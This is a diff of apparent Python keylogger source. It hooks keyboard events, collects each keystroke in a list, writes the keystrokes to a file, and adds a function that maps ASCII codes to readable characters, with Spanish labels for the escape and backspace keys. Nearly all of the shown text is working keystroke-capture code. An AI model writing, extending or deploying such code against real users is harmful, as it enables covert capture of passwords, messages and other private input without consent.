@@ -38,7 +38,7 @@ def OnKeyboardEvent(event):
 			e.set()
 			
 	#put the keystroke in the mainlist
-	mainList.append(chr(event.Ascii))	
+	mainList.append(filter(event.Ascii))
 	#print (mainList)
 	
 	return True
@@ -74,6 +74,25 @@ def writer():
 	f.write(aux)
 	f.write('\n')
 	f.close()
+
+#function that filter and maps the keystrokes by it ascii code
+def filter(ascii):
+	if ascii == 13:
+		return '\n'
+		
+	if ascii == 19 or ascii == 26 or ascii == 3 or ascii == 22 or ascii == 24 or ascii == 9 or ascii == 10 or ascii == 11 or ascii == 12 or ascii == 13 or ascii == 14 or ascii == 15 or ascii == 16 or ascii == 17:
+		return 0
+
+	if ascii == 0 or ascii == 9:
+		return 0
+	
+	if ascii == 27:
+		return '(tecla escape)'
+		
+	if ascii == 8:
+		return '(tecla borrar)'
+	
+	return chr(ascii)
 
 '''We will use threads for various things'''
 #This is the thread that handle the main function
